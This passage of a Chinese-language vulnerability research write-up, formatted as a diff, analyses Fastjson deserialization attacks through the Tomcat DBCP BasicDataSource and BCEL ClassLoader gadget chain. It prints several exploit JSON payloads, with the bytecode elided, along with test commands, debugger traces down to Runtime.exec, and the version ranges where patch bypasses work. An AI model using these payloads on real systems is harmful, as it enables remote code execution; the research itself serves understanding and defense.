+    {
+        '@type':"java.lang.Class",
+        'val':'com.sun.org.apache.bcel.internal.util.ClassLoader'
+    },
+    'c':
+    {
+        '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+        'driverClassLoader':
+        {
+            '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        'driverClassName':'$$BCEL$$$l$8b...$A$A'
+    }
+}
+--------------------------------------------------------------------------
+
+原始意图是进行补丁绕过，但1.2.25未能得手。
+
+java \
+-cp "fastjson-1.2.25.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource_bad_2.json
+
+Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.bcel.internal.util.ClassLoader
+        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:822)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:552)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
+        at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:62)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:767)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:594)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:916)
+        at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_BasicDataSource.deserialze(Unknown Source)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:517)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
+        at com.alibaba.fastjson.JSON.parseObject(JSON.java:201)
+        at FastjsonDeserialize2.main(FastjsonDeserialize2.java:23)
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.25
+ *
+ * com.alibaba.fastjson.parser.ParserConfig.checkAutoType
+ *
+ * 处理"com.sun.org.apache.bcel.internal.util.ClassLoader"时，虽然
+ * autoTypeSupport为false，但expectClass不为null，等于
+ * "java.lang.ClassLoader"，下面的黑名单检查无法绕过
+ */
+if (autoTypeSupport || expectClass != null) {
+    for (int i = 0; i < acceptList.length; ++i) {
+        String accept = acceptList[i];
+        if (className.startsWith(accept)) {
+            return TypeUtils.loadClass(typeName, defaultClassLoader);
+        }
+    }
+
+    for (int i = 0; i < denyList.length; ++i) {
+        String deny = denyList[i];
+        if (className.startsWith(deny)) {
+/*
+ * 822行
+ */
+            throw new JSONException("autoType is not support. " + typeName);
+        }
+    }
+}
+--------------------------------------------------------------------------
+
+7.4) Fastjson_BasicDataSource_bad_3.json
+
+--------------------------------------------------------------------------
+[
+    {
+        '@type':"java.lang.Class",
+        'val':'org.apache.tomcat.dbcp.dbcp.BasicDataSource'
+    },
+    {
+        '@type':"java.lang.Class",
+        'val':'com.sun.org.apache.bcel.internal.util.ClassLoader'
+    },
+    {
+        '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+        'driverClassLoader':
+        {
+            '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        'driverClassName':'$$BCEL$$$l$8b...$A$A'
+    }
+]
+--------------------------------------------------------------------------
+
+原始意图是进行补丁绕过，但1.2.25未能得手。
+
+java \
+-cp "fastjson-1.2.25.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource_bad_3.json
+
+失败，原因同上。
+
+8) org.apache.tomcat.dbcp.dbcp2.BasicDataSource
+
+BasicDataSource所在package变了一点点，攻击原理同前。
+
+8.1) Fastjson_BasicDataSource2.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+    'driverClassLoader':
+    {
+        '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A'
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-9.0.20.jar:tomcat-juli-9.0.20.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource2.json
+
+9) 通用性更好的PoC
+
+前面各小节写完后，发现存于待读队列中的KINGX的大作[76]，我应该先读他这篇的，
+又多走了不少弯路。文中有个小八卦，应该是TSRC在2017年捕获到在野利用，其中有
+一个通用性更好的PoC，攻防双方都很厉害，佩服。
+
+9.1) Fastjson_BasicDataSource3.json
+
+这是KINGX所说的通用性更好的PoC。
+
+--------------------------------------------------------------------------
+{
+    {
+        '@type':"com.alibaba.fastjson.JSONObject",
+        'a':
+        {
+            '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+            'driverClassLoader':
+            {
+                '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+            },
+            'driverClassName':'$$BCEL$$$l$8b...$A$A'
+        }
+    }:'b'
+}
+--------------------------------------------------------------------------
+
+反序列化时首先得到一个JSONObject对象，然后将该JSONObject对象置于"JSON Key"
+的位置。Fastjson在反序列化时会对"JSON Key"自动调用JSON.toString()。
+JSONObject是Map的子类，执行toString()时会将当前对象转为字符串形式，会提取
+类中所有Field，自然会执行相应的getter方法，以此调用:
+
+org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection()
+
+为完成攻击，必须调用上述函数。前面都是KINGX给的解释性说明，不关我事。
+
+JSON.parse()、JSON.parseObject()有很多重载版本，其行为各不相同。网上有一些
+关于它们的小结，比如哪些getter会被调用。但我要说一句，这些小结你可以领会其
+大意，但绝不要当成真理，我看到的所有这类小结都不严谨，以偏概全，某些情况下
+会误导你。
+
+不说各种重载版本JSON.parse()、JSON.parseObject()之间的区别，单说网上常提的
+"符合特定条件的getter会被调用"。参看:
+
+com.alibaba.fastjson.util.JavaBeanInfo.build()
+
+那些所谓的特定条件都在这个函数中体现。建议看fastjson-*-sources.jar，如果用
+JD-GUI直接看fastjson-*.jar，没有注释。参[33]。
+
+在JavaBeanInfo.build()语境下，BasicDataSource.getConnection()不符合特定条
+件。而Fastjson_BasicDataSource3.json的写法增大了此getter被调用的可能性，这
+种写法不局限于BasicDataSource攻击链，诸君细品。
+
+检查1.2.68的"DefaultJSONParser:472"，把key.toString()的逻辑删掉了，上述技
+巧失效。未查最早删除这段逻辑的版本是哪个。
+
+9.2) 测试
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource3.json
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource3.json
+
+与使用Fastjson_BasicDataSource.json时不同，上述两条命令均得手。
+
+调试FastjsonDeserialize:
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource3.json
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassLoader
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassName
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection()
+stop in com.sun.org.apache.bcel.internal.util.ClassLoader.createClass
+stop in java.lang.Runtime.exec(java.lang.String[])
+stop in java.io.PrintStream.println(java.lang.String)
+monitor wherei
+
+9.3) 简化版调用关系
+
+--------------------------------------------------------------------------
+JSON.parseObject                                                                // 8u232+1.2.24+7.0.99
+  JSON.parseObject                                                              // JSON:422
+    JSON.parseObject                                                            // JSON:452
+      JSON.parseObject                                                          // JSON:370
+        JSON.parseObject                                                        // JSON:270
+          JSON.parseObject                                                      // JSON:307
+            DefaultJSONParser.parseObject                                       // JSON:339
+                                                                                // parseObject(Type type, Object fieldName)
+              JavaObjectDeserializer.deserialze                                 // DefaultJSONParser:639
+                DefaultJSONParser.parse                                         // JavaObjectDeserializer:45
+                  DefaultJSONParser.parseObject                                 // DefaultJSONParser:1327
+                                                                                // parseObject(Map object, Object fieldName)
+                    DefaultJSONParser.parse                                     // DefaultJSONParser:296
+                                                                                // key = parse()
+                                                                                // 1.2.68的行号是285
+                      DefaultJSONParser.parse                                   // DefaultJSONParser:1293
+                        DefaultJSONParser.parseObject                           // DefaultJSONParser:1327
+                          MapDeserializer.deserialze                            // DefaultJSONParser:368
+                            DefaultJSONParser.parseObject                       // MapDeserializer:28
+                              DefaultJSONParser.parseObject                     // DefaultJSONParser:1081
+                                DefaultJSONParser.parseObject                   // DefaultJSONParser:1076
+                                  DefaultJSONParser.parseObject                 // DefaultJSONParser:517
+                                    JavaBeanDeserializer.deserialze             // DefaultJSONParser:368
+                                      JavaBeanDeserializer.parseRest            // JavaBeanDeserializer:184
+                                        JavaBeanDeserializer.deserialze         // JavaBeanDeserializer:922
+                                          JavaBeanDeserializer.parseField       // JavaBeanDeserializer:600
+                                            DefaultFieldDeserializer.parseField // JavaBeanDeserializer:773
+                                              FieldDeserializer.setValue        // DefaultFieldDeserializer:83
+                                                BasicDataSource.setDriverClassLoader
+                                                                                // FieldDeserializer:96
+                                                BasicDataSource.setDriverClassName
+                                                                                // 攻击者可控
+                    JSON.toString                                               // DefaultJSONParser:436
+                                                                                // key = (key == null) ? "null" : key.toString()
+                                                                                // 1.2.68的行号是472，代码已经改成
+                                                                                // if (key == null) { key = "null"; }
+                                                                                // 把key.toString()的逻辑删掉了
+                      JSON.toJSONString                                         // JSON:793
+                        JSONSerializer.write                                    // JSON:799
+                          MapSerializer.write                                   // JSONSerializer:275
+                            BasicDataSource.getConnection                       // MapSerializer:251
+                              BasicDataSource.createDataSource                  // BasicDataSource:1103
+                                BasicDataSource.createConnectionFactory         // BasicDataSource:1467
+                                  Class.forName                                 // BasicDataSource:1559
+                                                                                // 第二形参initialize等于true
+                                    Class.forName0                              // java.lang.Class:348
+                                      java.lang.ClassLoader.loadClass
+                                        util.ClassLoader.loadClass              // java.lang.ClassLoader:351
+                                                                                // com.sun.org.apache.bcel.internal.util.ClassLoader
+                                          if (class_name.indexOf("$$BCEL$$") >= 0)
+                                                                                // util.ClassLoader:151
+                                          util.ClassLoader.createClass          // util.ClassLoader:152
+                                            index = class_name.indexOf("$$BCEL$$")
+                                                                                // util.ClassLoader:199
+                                            real_name = class_name.substring(index + 8)
+                                                                                // util.ClassLoader:200
+                                            Utility.decode                      // util.ClassLoader:204
+                                                                                // com.sun.org.apache.bcel.internal.classfile.Utility
+                                                                                // BCEL解码
+                                            ClassParser.<init>                  // util.ClassLoader:205
+                                                                                // com.sun.org.apache.bcel.internal.classfile.ClassParser
+                                            ClassParser.parse                   // util.ClassLoader:207
+                                              JavaClass.<clinit>                // ClassParser:206
+                                              JavaClass.<init>                  // ClassParser:206
+                                                                                // com.sun.org.apache.bcel.internal.classfile.JavaClass
+                                          bytes = clazz.getBytes()              // util.ClassLoader:162
+                                          java.lang.ClassLoader.defineClass
+                                                                                // util.ClassLoader:163
+                                                                                // cl = defineClass(class_name, bytes, 0, bytes.length)
+                                                                                // class_name等于driverClassName属性值
+                                                                                // bytes源自driverClassName属性值的BCEL解码
+                                            ClassLoader.defineClass             // java.lang.ClassLoader:635
+                                              java.lang.ClassLoader.defineClass1
+                                                                                // java.lang.ClassLoader:756
+                                                                                // defineClass()并不会执行静态代码块
+                                      EvilCode.<clinit>                         // 静态代码块
+                                                                                // Class.forName0()中会执行静态代码块
+                                                                                // 但不是通过defineClass()触发的
+                                        Runtime.exec
+                                  Class.newInstance                             // BasicDataSource:1584
+                                    EvilCode.<init>                             // 无参构造函数
+                                      PrintStream.println
+--------------------------------------------------------------------------
+
+10) 转储反序列化过程中动态生成的类
+
+在调试栈回溯中可能看到形如这样的类:
+
+com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl
+com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_BasicDataSource
+
+这些类是Fastjson反序列化过程中动态生成的，只存在于内存中。参[77]，看到一招，
+用于转储这些反序列化过程中动态生成的类。
+
+下面这两个函数负责动态生成上述类:
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.24
+ *
+ * com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.createJavaBeanDeserializer
+ */
+public ObjectDeserializer createJavaBeanDeserializer(ParserConfig config, JavaBeanInfo beanInfo) throws Exception {
+    Class<?> clazz = beanInfo.clazz;
+    if (clazz.isPrimitive()) {
+        throw new IllegalArgumentException("not support type :" + clazz.getName());
+    }
+
+    String className = "FastjsonASMDeserializer_" + seed.incrementAndGet() + "_" + clazz.getSimpleName();
+    String packageName = ASMDeserializerFactory.class.getPackage().getName();
+    String classNameType = packageName.replace('.', '/') + "/" + className;
+    String classNameFull = packageName + "." + className;
+
+    ClassWriter cw = new ClassWriter();
+    cw.visit(V1_5, ACC_PUBLIC + ACC_SUPER, classNameType, type(JavaBeanDeserializer.class), null);
+
+
+
+    _init(cw, new Context(classNameType, config, beanInfo, 3));
+    _createInstance(cw, new Context(classNameType, config, beanInfo, 3));
+    _deserialze(cw, new Context(classNameType, config, beanInfo, 5));
+
+    _deserialzeArrayMapping(cw, new Context(classNameType, config, beanInfo, 4));
+    byte[] code = cw.toByteArray();
+
+    Class<?> exampleClass = defineClassPublic(classNameFull, code, 0, code.length);
+
+    Constructor<?> constructor = exampleClass.getConstructor(ParserConfig.class, JavaBeanInfo.class);
+    Object instance = constructor.newInstance(config, beanInfo);
+
+    return (ObjectDeserializer) instance;
+}
+--------------------------------------------------------------------------
+/*
+ * 1.2.24
+ *
+ * com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.defineClassPublic
+ */
+private Class<?> defineClassPublic(String name, byte[] b, int off, int len) {
+    return classLoader.defineClassPublic(name, b, off, len);
+}
+--------------------------------------------------------------------------
+
+在调试器中拦截defineClassPublic()，第二形参b就是动态生成的类的字节码。
+
+假设用Eclipse Attach调试，在"Debug Shell"窗口中输入:
+
+(new java.io.FileOutputStream("out.class")).write(b)
+
+右键选中这行代码，选择Execute或Display。这行代码将在被调试的JVM中执行，不
+是在Eclipse进程空间中执行，所以out.class将保存在被调试JVM所在文件系统。远
+程调试时务必注意这点，我之前傻不拉叽地在Eclipse所在文件系统中找out.class，
+都动用Process Monitor了，硬是没发现其踪迹，差点怀疑人生。
+
+用jdb也可以转储，原理一样。
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource.json
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.defineClassPublic
+
+  [1] com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.defineClassPublic (ASMDeserializerFactory.java:89), pc = 0
+  [2] com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.createJavaBeanDeserializer (ASMDeserializerFactory.java:80), pc = 266
+  [3] com.alibaba.fastjson.parser.ParserConfig.createJavaBeanDeserializer (ParserConfig.java:591), pc = 512
+  [4] com.alibaba.fastjson.parser.ParserConfig.getDeserializer (ParserConfig.java:461), pc = 915
+  [5] com.alibaba.fastjson.parser.ParserConfig.getDeserializer (ParserConfig.java:312), pc = 31
+  [6] com.alibaba.fastjson.parser.DefaultJSONParser.parseObject (DefaultJSONParser.java:367), pc = 1,078
+  [7] com.alibaba.fastjson.parser.DefaultJSONParser.parse (DefaultJSONParser.java:1,327), pc = 222
+  [8] com.alibaba.fastjson.parser.DefaultJSONParser.parse (DefaultJSONParser.java:1,293), pc = 2
+  [9] com.alibaba.fastjson.JSON.parse (JSON.java:137), pc = 20
+  [10] com.alibaba.fastjson.JSON.parse (JSON.java:128), pc = 4
+  [11] com.alibaba.fastjson.JSON.parseObject (JSON.java:201), pc = 1
+  [12] FastjsonDeserialize2.main (FastjsonDeserialize2.java:23), pc = 11
+
+在jdb中执行:
+
+eval (new java.io.FileOutputStream("out.class")).write(b)
+
+之前不知道调试器中可以这样用评估表达式，孤陋寡闻了。转储动态生成的类没啥大
+意义，只是满足好奇心。
+
+1.2.68用的是:
+
+com.alibaba.fastjson.util.ASMClassLoader.defineClassPublic()
+
+11) 通过$ref指定被触发的getter
+
+参[77]，作者提到threedream发现一种办法，使得Fastjson反序列过程中可以调用指
+定getter。本节对之测试一番。
+
+11.1) Fastjson_BasicDataSource4.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+    'driverClassLoader':
+    {
+        '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A',
+    'a':
+    {
+        '$ref':'$.connection'
+    }
+}
+--------------------------------------------------------------------------
+
+Fastjson_BasicDataSource4.json长得跟Fastjson_BasicDataSource.json很像，但
+多了一些内容:
+
+--------------------------------------------------------------------------
+    'a':
+    {
+        '$ref':'$.connection'
+    }
+--------------------------------------------------------------------------
+
+按[77]的说法，从Fastjson 1.2.36开始，可以通过$ref指定被引用的属性，从而间
+接指定被触发的getter。
+
+JavaBeanDeserializer支持$ref这种技巧，ThrowableDeserializer不支持，后者没
+有parseField()方法。
+
+11.2) 测试
+
+之前说过，FastjsonDeserialize调的是:
+
+JSON.parseObject( fis, Object.class, Feature.SupportNonPublicField )
+
+FastjsonDeserialize反序列化Fastjson_BasicDataSource.json时未能得手，原因是
+没机会调用:
+
+org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection()
+
+现在尝试用FastjsonDeserialize反序列化Fastjson_BasicDataSource4.json。之前
+还说过，BasicDataSource攻击链只能用于1.2.24及更低版本，主要原因是更高版本
+的黑名单检查。而$ref这种用法要求1.2.36及更高版本。想搞清楚$ref背后的机理，
+[77]里说了一些，若想搞清楚，还是自己调试吧。决定用1.2.68进行测试，启用白名
+单。
+
+java \
+-Dfastjson.parser.autoTypeSupport=true \
+-Dfastjson.parser.autoTypeAccept=org.,com. \
+-cp "fastjson-1.2.68.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource4.json
+
+启用白名单之后可达预期目的，连异常都没有抛。注意，此次调试分析与漏洞无关，
+是寻找$ref背后的机理。
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-Dfastjson.parser.autoTypeSupport=true \
+-Dfastjson.parser.autoTypeAccept=org.,com. \
+-cp "fastjson-1.2.68.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource4.json
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop at com.alibaba.fastjson.parser.ParserConfig:1311
+stop in com.alibaba.fastjson.util.ASMClassLoader.defineClassPublic
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassLoader
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassName
+stop at com.alibaba.fastjson.parser.DefaultJSONParser:399
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection()
+stop in com.sun.org.apache.bcel.internal.util.ClassLoader.createClass
+stop in java.lang.Runtime.exec(java.lang.String[])
+stop in java.io.PrintStream.println(java.lang.String)
+monitor wherei
+
+断点依次命中。
+
+11.4) 简化版调用关系
+
+--------------------------------------------------------------------------
+JSON.parseObject                                                        // 8u232+1.2.68+7.0.99
+                                                                        // parseObject(InputStream is, Type type, Feature... features)
+  JSON.parseObject                                                      // JSON:461
+                                                                        // parseObject(String input, Type clazz, ParserConfig config, ParseProcess processor, int featureValues, Feature... features)
+    DefaultJSONParser.parseObject                                       // JSON:396
+                                                                        // parseObject(Type type, Object fieldName)
+      JavaObjectDeserializer.deserialze                                 // DefaultJSONParser:688
+        DefaultJSONParser.parse                                         // JavaObjectDeserializer:46
+          DefaultJSONParser.parseObject                                 // DefaultJSONParser:1401
+                                                                        // parseObject(Map object, Object fieldName)
+            ParserConfig.checkAutoType                                  // DefaultJSONParser:333
+                                                                        // typeName等于"org.apache.tomcat.dbcp.dbcp.BasicDataSource"
+                                                                        // 通过白名单检查
+                                                                        // 加载"org.apache.tomcat.dbcp.dbcp.BasicDataSource"
+            JavaBeanDeserializer.deserialze                             // DefaultJSONParser:395
+              FastjsonASMDeserializer_1_BasicDataSource.deserialze      // JavaBeanDeserializer:284
+                JavaBeanDeserializer.parseRest
+                  JavaBeanDeserializer.deserialze                       // JavaBeanDeserializer:1573
+                                                                        // protected <T> T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features, int[] setFlags)
+                    for (int fieldIndex = 0, notMatchCount = 0;; fieldIndex++)
+                                                                        // JavaBeanDeserializer:511
+                                                                        // 循环解析属性
+                    JavaBeanDeserializer.parseField                     // JavaBeanDeserializer:866
+                      DefaultFieldDeserializer.parseField               // JavaBeanDeserializer:1248
+                        FieldDeserializer.setValue                      // DefaultFieldDeserializer:123
+                          BasicDataSource.setDriverClassLoader          // FieldDeserializer:110
+                                                                        // 处理"driverClassLoader"、"driverClassName"属性
+                          BasicDataSource.setDriverClassName
+                                                                        // 攻击者可控
+                    JavaBeanDeserializer.parseField                     // JavaBeanDeserializer:866
+                                                                        // ThrowableDeserializer没有parseField()方法
+                      DefaultJSONParser.parseExtra                      // JavaBeanDeserializer:1227
+                        DefaultJSONParser.parse                         // DefaultJSONParser:1623
+                          DefaultJSONParser.parse                       // DefaultJSONParser:1367
+                            DefaultJSONParser.parseObject               // DefaultJSONParser:1401
+                              if (key == "$ref"                         // DefaultJSONParser:399
+                                                                        // 处理"$ref"属性
+                              DefaultJSONParser.addResolveTask          // DefaultJSONParser:444
+                                                                        // 后面由handleResovleTask()接着处理
+    DefaultJSONParser.handleResovleTask                                 // JSON:398
+      if (ref.startsWith("$"))                                          // DefaultJSONParser:1564
+      JSONPath.eval                                                     // DefaultJSONParser:1570
+                                                                        // rootObject是BasicDataSource实例
+        segment = segments[i]                                           // JSONPath:106
+                                                                        // 只有一个"JSONPath$PropertySegment"
+        JSONPath$PropertySegment.eval                                   // JSONPath:107
+                                                                        // segment.eval(this, rootObject, currentObject)
+          JSONPath.getPropertyValue                                     // JSONPath:2041
+            JavaBeanSerializer.getFieldValue                            // JSONPath:3546
+                                                                        // beanSerializer.getFieldValue(currentObject, propertyName, propertyNameHash, false)
+                                                                        // propertyName等于"connection"
+              FieldSerializer.getPropertyValue                          // JavaBeanSerializer:614
+                FieldInfo.get                                           // FieldSerializer:153
+                  BasicDataSource.getConnection                         // FieldInfo:544
+--------------------------------------------------------------------------
+
+11.5) Fastjson_BasicDataSource5.json
+
+参[32]，看了一下JSONPath的wiki，基于"$ref"属性的处理流程，可以这样写json:
+
+--------------------------------------------------------------------------
+{
+    '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+    'driverClassLoader':
+    {
+        '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A',
+    'a':
+    {
+        '$ref':"$['connection']"
+    }
+}
+--------------------------------------------------------------------------
+
+$['connection']和$.connection都表示名为connection的属性。
+
+java \
+-Dfastjson.parser.autoTypeSupport=true \
+-Dfastjson.parser.autoTypeAccept=org.,com. \
+-cp "fastjson-1.2.68.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource5.json
+
+可达预期目的，未抛异常。
+
+java \
+-Dfastjson.parser.autoTypeSupport=true \
+-Dfastjson.parser.autoTypeAccept=org.,com. \
+-cp "fastjson-1.2.68.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource5.json
+
+可达预期目的，但抛了异常，输出2次"scz is here"，恶意代码被执行了2次。
+
+强调一下，$ref本身不形成漏洞，只是增大getter被调用的可能性。
+
+12) Fastjson_BasicDataSource6_bad.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+    'driverClassLoader':
+    {
+        '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A',
+    'logWriter':null
+}
+--------------------------------------------------------------------------
+
+这是个YY出来的方案，Fastjson不能成功。同样的技术原理，Jackson可以成功。
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource6_bad.json
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource6_bad.json
+
+上述两条命令均抛异常:
+
+Exception in thread "main" com.alibaba.fastjson.JSONException: default constructor not found. class java.io.PrintWriter
+        at com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:213)
+        at com.alibaba.fastjson.parser.ParserConfig.createJavaBeanDeserializer(ParserConfig.java:526)
+        at com.alibaba.fastjson.parser.ParserConfig.getDeserializer(ParserConfig.java:461)
+
+本意是触发:
+
+org.apache.tomcat.dbcp.dbcp.BasicDataSource.setLogWriter()
+
+其函数原型是:
+
+public void setLogWriter ( java.io.PrintWriter logWriter )
+
+反序列化时先去找java.io.PrintWriter的无参构造函数，没有，抛异常。
+
+13) Fastjson_BasicDataSource7.json (33~36可利用)
+
+2020.10.19，微博ID为"香依香偎"的网友反馈了个问题，指出[25,32]、48及以上版
+本无法利用BasicDataSource，但[33,47]可以利用，而不是之前想像的25及以上版本
+都无法利用。参看:
+
+https://github.com/yaojieno1/Fastjson_Poc_1.2.36_bcel
+https://github.com/yaojieno1/Fastjson_Poc_1.2.36_bcel/blob/master/src/main/resources/poc-bcel-36-parseobject.txt
+https://github.com/yaojieno1/Fastjson_Poc_1.2.36_bcel/blob/master/src/main/resources/poc-bcel-37-parseobject.txt
+
+把Fastjson_BasicDataSource_bad_2.json、Fastjson_BasicDataSource3.json结合
+一下，形成Fastjson_BasicDataSource7.json。
+
+--------------------------------------------------------------------------
+{
+    'a':
+    {
+        '@type':"java.lang.Class",
+        'val':'org.apache.tomcat.dbcp.dbcp.BasicDataSource'
+    },
+    'b':
+    {
+        '@type':"java.lang.Class",
+        'val':'com.sun.org.apache.bcel.internal.util.ClassLoader'
+    },
+    {
+        '@type':"com.alibaba.fastjson.JSONObject",
+        'c':
+        {
+            '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+            'driverClassLoader':
+            {
+                '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+            },
+            'driverClassName':'$$BCEL$$$l$8b...$A$A'
+        }
+    }:'d'
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.33.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource7.json
+
+java \
+-cp "fastjson-1.2.33.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource7.json
+
+ls -l /tmp/scz_is_here
+
+13.1) 为什么33~36可利用
+
+参看:
+
+https://github.com/alibaba/fastjson/compare/1.2.25...1.2.33
+https://github.com/alibaba/fastjson/compare/1.2.25...1.2.33.diff
+https://github.com/alibaba/fastjson/commit/df8daa40356236a2133e335f6ea0a671e89663b0
+
+"香依香偎"指出如下829行处的变化。
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.33
+ *
+ * com.alibaba.fastjson.parser.ParserConfig.checkAutoType(String, Class) : Class
+ */
+public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
+    if (typeName == null) {
+        return null;
+    }
+
+    if (typeName.length() >= maxTypeNameLength) {
+        throw new JSONException("autoType is not support. " + typeName);
+    }
+
+    final String className = typeName.replace('$', '.');
+
+    if (autoTypeSupport || expectClass != null) {
+        for (int i = 0; i < acceptList.length; ++i) {
+            String accept = acceptList[i];
+            if (className.startsWith(accept)) {
+                return TypeUtils.loadClass(typeName, defaultClassLoader);
+            }
+        }
+
+        for (int i = 0; i < denyList.length; ++i) {
+            String deny = denyList[i];
+/*
+ * 829行，1.2.25此处只有
+ *
+ * if (className.startsWith(deny))
+ *
+ * 1.2.33此处增加了
+ *
+ * TypeUtils.getClassFromMapping(typeName) == null
+ */
+            if (className.startsWith(deny) && TypeUtils.getClassFromMapping(typeName) == null) {
+                throw new JSONException("autoType is not support. " + typeName);
+            }
+        }
+    }
+--------------------------------------------------------------------------
+
+13.2) 为什么37不可利用
+
+参看:
+
+https://github.com/alibaba/fastjson/compare/1.2.33...1.2.37
+https://github.com/alibaba/fastjson/compare/1.2.33...1.2.37.diff
+https://github.com/alibaba/fastjson/commit/33eaec097f6cf7c23c7cf8dc08f9ca7b21f9f54c
+
+"香依香偎"指出如下416行处的变化
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.37
+ *
+ * com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(Map, Object) : Object
+ */
+public final Object parseObject(final Map object, Object fieldName) {
+...
+/*
